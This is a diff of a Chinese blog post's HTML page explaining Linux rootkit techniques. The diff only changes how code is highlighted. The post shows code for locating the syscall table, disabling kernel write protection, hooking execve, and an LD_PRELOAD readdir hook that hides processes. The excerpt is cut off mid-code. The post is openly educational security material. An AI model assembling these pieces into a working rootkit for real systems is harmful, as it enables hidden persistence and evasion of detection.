@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":true,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="原理rootkit介绍0x01    功能rootkit可以简单理解root.kit，即攻击者取得root权限后所用的工具包，一般来说，90%的rootkit主要目标都是来做对攻击者后门行为的隐藏，但仍有部分rootkit是存在系统操纵和数据收集行为的，包括键盘记录、流量嗅探及程序运行重定向等等；通常来说，rootkit的功能越单一，就越难检测到，一旦rootkit行为太多，很可能触及一些chec">
@@ -100,7 +100,7 @@
   </style>
 </noscript>
 
-<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+</head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
   <div class="headband"></div>
@@ -331,34 +331,16 @@
 <a id="more"></a>
 
 <p>一个最基础的lkm如下：</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span>                                                                            #包含内核使用的一些函数、变量、宏等等</span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span>                                                                            #包含模块结构的定义及模块版本控制等等</span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/init.h></span>                                                                                #包含了module_init和module_exit函数的声明</span>
-<span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                #许可证
-<span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">hello_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_WARNING <span class="token string">"HELLOWORLD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;																			#包含内核使用的一些函数、变量、宏等等</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;																			#包含模块结构的定义及模块版本控制等等</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;																				#包含了module_init和module_exit函数的声明</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);																				#许可证</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_WARNING <span class="string">"HELLOWORLD"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(<span class="string">"BYE"</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(hello_init);																			#模块加载函数</span><br><span class="line">module_exit(hello_exit);																			#模块卸载函数</span><br></pre></td></tr></table></figure>
 
-<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">hello_exit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"BYE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token function">module_init</span><span class="token punctuation">(</span>hello_init<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                            #模块加载函数
-<span class="token function">module_exit</span><span class="token punctuation">(</span>hello_exit<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                            #模块卸载函数
-</code></pre>
 <p>Makefile文件如下：</p>
-<pre class=" language-makefile"><code class="language-makefile"> obj-m <span class="token operator">:=</span> hello_module.o
- KERNELBUILD <span class="token operator">:=</span> /lib/modules/<span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">shell</span> uname -r<span class="token punctuation">)</span>/build
- CURRENT_PATH <span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">shell</span> pwd<span class="token punctuation">)</span>
-<span class="token symbol"> all</span><span class="token punctuation">:</span>
-     make -C <span class="token variable">$</span><span class="token punctuation">(</span>KERNELBUILD<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span>CURRENT_PATH<span class="token punctuation">)</span> modules
-<span class="token symbol"> clean</span><span class="token punctuation">:</span>
-     make -C <span class="token variable">$</span><span class="token punctuation">(</span>KERNELBUILD<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span>CURRENT_PATH<span class="token punctuation">)</span> clean</code></pre>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obj-m := hello_module.o</span><br><span class="line">KERNELBUILD := /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line">CURRENT_PATH := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    make -C <span class="variable">$(KERNELBUILD)</span> M=<span class="variable">$(CURRENT_PATH)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    make -C <span class="variable">$(KERNELBUILD)</span> M=<span class="variable">$(CURRENT_PATH)</span> clean</span><br></pre></td></tr></table></figure>
+
 <h4 id="0x04-hook"><a href="#0x04-hook" class="headerlink" title="0x04    hook"></a>0x04    hook</h4><p>rootkit无论如何也绕不去的一个坎。rootkit本质上其实就是通过hook进行工作的，根据rootkit工作的层级，其hook的对象也有差异，一般来说，内核态rootkit hook系统调用，用户态rootkit hook libc；从用户态出发，程序不可避免会去执行libc库中的函数，libc去调系统调用切进内核调内核函数，一旦hook了syscall/libc，就相当于劫持了程序在用户态/内核态的控制流，rootkit最核心的一点就在于这里。</p>
 <h3 id="syscall-amp-amp-libc-hook"><a href="#syscall-amp-amp-libc-hook" class="headerlink" title="syscall &amp;&amp; libc hook"></a>syscall &amp;&amp; libc hook</h3><h4 id="0x01-系统调用方式和演变过程"><a href="#0x01-系统调用方式和演变过程" class="headerlink" title="0x01    系统调用方式和演变过程"></a>0x01    系统调用方式和演变过程</h4><p>由于内核rootkit需要对系统调用进行hook，linux系统调用流程有必要去了解，后续可以了解到不同版本系统、cpu架构下的hook方式其实是有较大差别的。linux系统调用方式的演进如下所示：</p>
-<pre><code>int 0x80    -&gt;    sysenter/syscall    -&gt;    vsdo</code></pre><p><strong>int 0x80</strong></p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">int</span> 0x80	-&gt;</span>	<span class="function"><span class="title">sysenter</span>/syscall	-&gt;</span>	vsdo</span><br></pre></td></tr></table></figure>
+
+<p><strong>int 0x80</strong></p>
 <p>早期的x86处理器使用int 0x80进行软中断触发系统调用从用户态切换到内核态执行内核函数，一般来说经典软中断要经历如下几个流程：</p>
 <p>1、应用程序调c库</p>
 <p>2、c库函数内部调系统调用，将参数放到栈上，将系统调用号放到寄存器（eax），布置完后调int 0x80</p>
@@ -396,143 +378,41 @@
 <p>2、/proc/kallsyms | /boot/System.map</p>
 <p>3、IDT</p>
 <p><strong>暴力搜索</strong></p>
-<pre><code>unsigned long **
-get_sct_via_sys_close(void)
-{
-    unsigned long **entry = (unsigned long **)PAGE_OFFSET;
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> **</span><br><span class="line">get_sct_via_sys_close(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> **entry = (<span class="keyword">unsigned</span> <span class="keyword">long</span> **)PAGE_OFFSET;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;(<span class="keyword">unsigned</span> <span class="keyword">long</span>)entry &lt; ULONG_MAX; entry += <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (entry[__NR_close] == (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)sys_close) &#123;</span><br><span class="line">            <span class="keyword">return</span> entry;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    for (;(unsigned long)entry &lt; ULONG_MAX; entry += 1) {
-        if (entry[__NR_close] == (unsigned long *)sys_close) {
-            return entry;
-        }
-    }
-
-    return NULL;
-}</code></pre><p>PAGE_OFFSET是宏定义，代表内核页起始地址，sys_close表示具体的系统调用函数指针，__NR_close可理解为系统调用号，此函数表示从内核页起始地址开始遍历，一旦检测到存在内核地址+系统调用号偏移对应的指针指向的地址空间为sys_close系统调用函数指针，则认为该地址为系统调用表地址。</p>
+<p>PAGE_OFFSET是宏定义，代表内核页起始地址，sys_close表示具体的系统调用函数指针，__NR_close可理解为系统调用号，此函数表示从内核页起始地址开始遍历，一旦检测到存在内核地址+系统调用号偏移对应的指针指向的地址空间为sys_close系统调用函数指针，则认为该地址为系统调用表地址。</p>
 <p><strong>/proc/kallsyms｜/boot/System.map</strong></p>
 <p><img src="./image-20200911004704932.png" alt="image-20200911004704932"></p>
 <p><img src="./image-20200911004836610.png" alt="image-20200911004836610"></p>
 <p>/boot/System.map在系统初始化时存储了内核的全量符号表，包括内核函数和变量符号地址对应关系；/proc/kallsyms除了内核符号外还额外存储了其它需动态加载模块的符号信息，导致其要比前者大一点。两张表中都存有系统调用表的硬编码地址。</p>
 <p><strong>IDT</strong></p>
-<pre><code>unsigned long  *find_sys_call_table(void)
-{
-    unsigned int sys_call_off;
-    char *p;
-    int i;
-    unsigned int ret;
-    asm(&quot;sidt %0&quot;:&quot;=m&quot;(idtr));
-    printk(&quot;br: idt table-0x%x\n&quot;, idtr.addr);
-    memcpy(&amp;idt, idtr.addr+8*0x80, sizeof(idt));
-    sys_call_off = ((idt.offset_2 &lt;&lt; 16) | idt.offset_1);
-    p = sys_call_off;
-    for(i = 0; i &lt; 100; i++){
-        if(p[i] == &#39;\xff&#39; &amp;&amp; p[i+1] == &#39;\x14&#39; &amp;&amp; p[i+2] == &#39;\x85&#39;)
-            ret = *(unsigned int *)(p + i + 3);
-    }
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span>  *<span class="title">find_sys_call_table</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> sys_call_off;</span><br><span class="line">	<span class="keyword">char</span> *p;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ret;</span><br><span class="line">	<span class="keyword">asm</span>(<span class="string">"sidt %0"</span>:<span class="string">"=m"</span>(idtr));</span><br><span class="line">	printk(<span class="string">"br: idt table-0x%x\n"</span>, idtr.addr);</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;idt, idtr.addr+<span class="number">8</span>*<span class="number">0x80</span>, <span class="keyword">sizeof</span>(idt));</span><br><span class="line">	sys_call_off = ((idt.offset_2 &lt;&lt; <span class="number">16</span>) | idt.offset_1);</span><br><span class="line">	p = sys_call_off;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(p[i] == <span class="string">'\xff'</span> &amp;&amp; p[i+<span class="number">1</span>] == <span class="string">'\x14'</span> &amp;&amp; p[i+<span class="number">2</span>] == <span class="string">'\x85'</span>)</span><br><span class="line">			ret = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(p + i + <span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printk(<span class="string">"br: sys_call_table-0x%x\n"</span>, ret);</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">long</span>**)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    printk(&quot;br: sys_call_table-0x%x\n&quot;, ret);
-    return (unsigned long**)ret;
-}</code></pre><p>在软中断的系统调用场景中，可以通过先拿到idt中断描述符表地址，然后在0x80对应的中断例程system_call函数空间内搜索call sys_call_table汇编中call对应的call(\xff\x14\x85)硬编码特征的方式拿到sys_call_table具体地址。</p>
-<pre><code>void *get_sys_call_table(void) {
-    void *system_call;
-    unsigned char *ptr;
-    int i, low, high;
+<p>在软中断的系统调用场景中，可以通过先拿到idt中断描述符表地址，然后在0x80对应的中断例程system_call函数空间内搜索call sys_call_table汇编中call对应的call(\xff\x14\x85)硬编码特征的方式拿到sys_call_table具体地址。</p>
+<figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">void</span> *get_sys_call_table(<span class="built_in">void</span>) &#123;</span><br><span class="line">    <span class="built_in">void</span> *system_call;</span><br><span class="line">    unsigned <span class="built_in">char</span> *<span class="keyword">ptr</span>;</span><br><span class="line">    <span class="built_in">int</span> i, low, high;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"rdmsr"</span> : <span class="string">"=a"</span> (low), <span class="string">"=d"</span> (high) : <span class="string">"c"</span> (<span class="type">IA32_LSTAR</span>));</span><br><span class="line">    system_call = (<span class="built_in">void</span>*)(((long)high&lt;&lt;<span class="number">32</span>) | low);</span><br><span class="line">    printk(<span class="type">KERN_INFO</span> <span class="string">"system_call: 0x%p"</span>, system_call);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">ptr</span>=system_call, i=<span class="number">0</span>; i&lt;<span class="number">500</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">ptr</span>[<span class="number">0</span>] == <span class="number">0xff</span> &amp;&amp; <span class="keyword">ptr</span>[<span class="number">1</span>] == <span class="number">0x14</span> &amp;&amp; <span class="keyword">ptr</span>[<span class="number">2</span>] == <span class="number">0xc5</span>)</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">void</span>*)(<span class="number">0xffffffff00000000</span> | *((unsigned <span class="built_in">int</span>*)(<span class="keyword">ptr</span>+<span class="number">3</span>)));</span><br><span class="line">        <span class="keyword">ptr</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    asm(&quot;rdmsr&quot; : &quot;=a&quot; (low), &quot;=d&quot; (high) : &quot;c&quot; (IA32_LSTAR));
-    system_call = (void*)(((long)high&lt;&lt;32) | low);
-    printk(KERN_INFO &quot;system_call: 0x%p&quot;, system_call);
-    for (ptr=system_call, i=0; i&lt;500; i++) {
-        if (ptr[0] == 0xff &amp;&amp; ptr[1] == 0x14 &amp;&amp; ptr[2] == 0xc5)
-            return (void*)(0xffffffff00000000 | *((unsigned int*)(ptr+3)));
-        ptr++;
-    }
-    return NULL;
-}</code></pre><p>Sysenter/syscall的场景与软中断类似，省略了根据idt找system_call的步骤，以及64位下的call机器码为\xff\x14\xc5，其余与软中断基本一致。</p>
+<p>Sysenter/syscall的场景与软中断类似，省略了根据idt找system_call的步骤，以及64位下的call机器码为\xff\x14\xc5，其余与软中断基本一致。</p>
 <p><strong>内存写保护关闭</strong></p>
-<pre><code>void
-disable_wp(void)
-{
-    unsigned long cr0;
-    preempt_disable();
-    cr0 = read_cr0();
-    clear_bit(X86_CR0_WP_BIT, &amp;cr0);
-    write_cr0(cr0);
-    preempt_enable();
-    return;
-}</code></pre><p>系统调用表在内核中是只读的，直接修改内存会导致内核oops；修改系统调用表需要暂时关闭系统的内存写保护，这块内核有api可以直接调用，不需要写内联汇编；内存读写保护状态保存在cr0寄存器中，在调用相关函数设置cr0寄存器bit置位时需提前加自旋锁，防止被内核抢占，避免执行内存写保护关闭过程中出现内核安全/稳定性风险。</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">disable<span class="constructor">_wp(<span class="params">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    unsigned long cr0;</span><br><span class="line">    preempt<span class="constructor">_disable()</span>;</span><br><span class="line">    cr0 = read<span class="constructor">_cr0()</span>;</span><br><span class="line">    clear<span class="constructor">_bit(X86_CR0_WP_BIT, &amp;<span class="params">cr0</span>)</span>;</span><br><span class="line">    write<span class="constructor">_cr0(<span class="params">cr0</span>)</span>;</span><br><span class="line">    preempt<span class="constructor">_enable()</span>;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>系统调用表在内核中是只读的，直接修改内存会导致内核oops；修改系统调用表需要暂时关闭系统的内存写保护，这块内核有api可以直接调用，不需要写内联汇编；内存读写保护状态保存在cr0寄存器中，在调用相关函数设置cr0寄存器bit置位时需提前加自旋锁，防止被内核抢占，避免执行内存写保护关闭过程中出现内核安全/稳定性风险。</p>
 <p><strong>系统调用覆写</strong></p>
-<pre><code>asmlinkage long
-fake_execve(const char __user *filename,
-            const char __user *const __user *argv,
-            const char __user *const __user *envp);
-asmlinkage long
-(*real_execve)(const char __user *filename,
-               const char __user *const __user *argv,
-               const char __user *const __user *envp);</code></pre><pre><code>asmlinkage long
-fake_execve(const char __user *filename,
-            const char __user *const __user *argv,
-            const char __user *const __user *envp)
-{
-    char *args;
-    char *buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
-    if (buff) {
-        args = join_strings(argv, &quot; &quot;, buff, PAGE_SIZE);
-    } else {
-        args = (char *)argv[0];
-        buff = NULL;
-    }
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage <span class="keyword">long</span></span><br><span class="line">fake_execve(<span class="keyword">const</span> <span class="keyword">char</span> __user *filename,</span><br><span class="line">            <span class="keyword">const</span> <span class="keyword">char</span> __user *<span class="keyword">const</span> __user *argv,</span><br><span class="line">            <span class="keyword">const</span> <span class="keyword">char</span> __user *<span class="keyword">const</span> __user *envp);</span><br><span class="line">asmlinkage <span class="keyword">long</span></span><br><span class="line">(*real_execve)(<span class="keyword">const</span> <span class="keyword">char</span> __user *filename,</span><br><span class="line">               <span class="keyword">const</span> <span class="keyword">char</span> __user *<span class="keyword">const</span> __user *argv,</span><br><span class="line">               <span class="keyword">const</span> <span class="keyword">char</span> __user *<span class="keyword">const</span> __user *envp);</span><br></pre></td></tr></table></figure>
 
-    fm_alert(&quot;execve: %s\n&quot;, args);
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage long</span><br><span class="line">fake_execve(<span class="keyword">const</span> <span class="keyword">char</span> __user *filename,</span><br><span class="line">            <span class="keyword">const</span> <span class="keyword">char</span> __user *<span class="keyword">const</span> __user *argv,</span><br><span class="line">            <span class="keyword">const</span> <span class="keyword">char</span> __user *<span class="keyword">const</span> __user *envp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *<span class="keyword">args</span>;</span><br><span class="line">    <span class="keyword">char</span> *buff = kmalloc(PAGE_SIZE, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (buff) &#123;</span><br><span class="line">        <span class="keyword">args</span> = join_strings(argv, <span class="string">" "</span>, buff, PAGE_SIZE);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">args</span> = (<span class="keyword">char</span> *)argv[0];</span><br><span class="line">        buff = NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fm_alert(<span class="string">"execve: %s\n"</span>, <span class="keyword">args</span>);</span><br><span class="line"></span><br><span class="line">    kfree(buff);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> real_execve(filename, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    kfree(buff);
+<p>定义两个函数指针，分别用来指向原生/伪造的系统调用函数，伪造函数自实现逻辑。</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># define HOOK_SCT(sct, name)                    \</span><br><span class="line">    do &#123;                                        \</span><br><span class="line">        real_##name = (void *)sct[__NR_##name]; \</span><br><span class="line">        sct[__NR_##name] = (void *)fake_##name; \</span><br><span class="line">    &#125; while (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"># define UNHOOK_SCT(sct, name)                  \</span><br><span class="line">    sct[__NR_##name] = (void *)real_##name</span><br></pre></td></tr></table></figure>
 
-    return real_execve(filename, argv, envp);
-}</code></pre><p>定义两个函数指针，分别用来指向原生/伪造的系统调用函数，伪造函数自实现逻辑。</p>
-<pre><code># define HOOK_SCT(sct, name)                    \
-    do {                                        \
-        real_##name = (void *)sct[__NR_##name]; \
-        sct[__NR_##name] = (void *)fake_##name; \
-    } while (0)
-
-# define UNHOOK_SCT(sct, name)                  \
-    sct[__NR_##name] = (void *)real_##name</code></pre><p>替换系统调用表中的函数指针，同时将原生函数指针保存在变量中，方便后续函数尾部执行返回正常功能。</p>
+<p>替换系统调用表中的函数指针，同时将原生函数指针保存在变量中，方便后续函数尾部执行返回正常功能。</p>
 <h4 id="0x03-libc-hook"><a href="#0x03-libc-hook" class="headerlink" title="0x03    libc hook"></a>0x03    libc hook</h4><p>libc hook本质与系统调用hook一致，不再赘述，linux上最有效的hook方式为ld_preload，为广大malware制作者所喜爱，ld_preload是linux系统的一个环境变量，可以影响程序运行时的动态链接，允许程序运行时优先加载ld_preload文件中自定义的函数。</p>
 <p>相比lkm，其有两个优点：<br>1、简单</p>
 <p>2、稳定</p>
 <p>简单是因为相对相对lkm，ld_preload的应用场景是在用户态，更偏向用户态常用的linux c编程；稳定是因为系统提供的机制，不用像lkm一样需要关注不同内核版本间的兼容性问题，侵入性相对hook系统调用改系统调用表要小很多，稳定性好。demo如下：</p>
 <p><img src="./image-20200911021546937.png" alt="image-20200911021546937"></p>
-<pre><code>#define DECLARE_READDIR(dirent, readdir)                                \
-static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
-                                                                        \
-struct dirent* readdir(DIR *dirp)                                       \
-{                                                                       \
-    if(original_##readdir == NULL) {                                    \
-        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
-        if(original_##readdir == NULL)                                  \
-        {                                                               \
-            fprintf(stderr, &quot;Error in dlsym: %s\n&quot;, dlerror());         \
-        }                                                               \
-    }                                                                   \
-                                                                        \
-    struct dirent* dir;                                                 \
-                                                                        \
-    while(1)                                                            \
-    {                                                                   \
-        dir = original_##readdir(dirp);                                 \
-        if(dir) {                                                       \
-            char dir_name[256];                                         \
-            char process_name[256];                                     \
-            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &amp;&amp;        \
-                strcmp(dir_name, &quot;/proc&quot;) == 0 &amp;&amp;                       \
-                get_process_name(dir-&gt;d_name, process_name) &amp;&amp;          \
-                strcmp(process_name, process_to_filter) == 0) {         \
-                continue;                                               \
-            }                                                           \
-        }                                                               \
-        break;                                                          \
-    }                                                                   \
-    return dir;                                                         \
-}</code></pre><p>这边hook了libc中的readdir，用来对应用程序调readdir解析vfs数据显示的进程进行过滤，尾部同lkm，返回时执行原生函数逻辑。</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define DECLARE_READDIR(dirent, readdir)                                \</span></span><br><span class="line">static struct dirent* (*original_<span class="comment">##readdir)(DIR*) = NULL;               \</span></span><br><span class="line">                                                                        <span class="string">\</span></span><br><span class="line">struct dirent* readdir(DIR *dirp)                                       <span class="string">\</span></span><br><span class="line">&#123;                                                                       <span class="string">\</span></span><br><span class="line">    <span class="keyword">if</span>(original_<span class="comment">##readdir == NULL) &#123;                                    \</span></span><br><span class="line">        original_<span class="comment">##readdir = dlsym(RTLD_NEXT, #readdir);               \</span></span><br><span class="line">        <span class="keyword">if</span>(original_<span class="comment">##readdir == NULL)                                  \</span></span><br><span class="line">        &#123;                                                               <span class="string">\</span></span><br><span class="line">            fprintf(stderr, <span class="string">"Error in dlsym: %s\n"</span>, dlerror());         <span class="string">\</span></span><br><span class="line">        &#125;                                                               <span class="string">\</span></span><br><span class="line">    &#125;                                                                   <span class="string">\</span></span><br><span class="line">                                                                        <span 